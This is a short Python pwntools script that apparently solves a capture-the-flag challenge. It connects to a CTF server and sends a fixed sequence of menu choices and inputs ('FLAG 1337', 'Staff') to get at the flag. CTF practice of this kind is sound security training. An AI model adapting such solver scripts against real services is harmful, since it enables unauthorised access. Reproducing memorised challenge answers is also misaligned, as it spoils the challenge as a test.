#!/usr/bin/python
from pwn import *

elf = remote('pwn.chall.pwnoh.io', 13383)

elf.sendlineafter('>', '1')
elf.sendlineafter('>', 'FLAG 1337')
elf.sendlineafter('>', '2')
elf.sendlineafter('>', 'Staff')
elf.interactive()
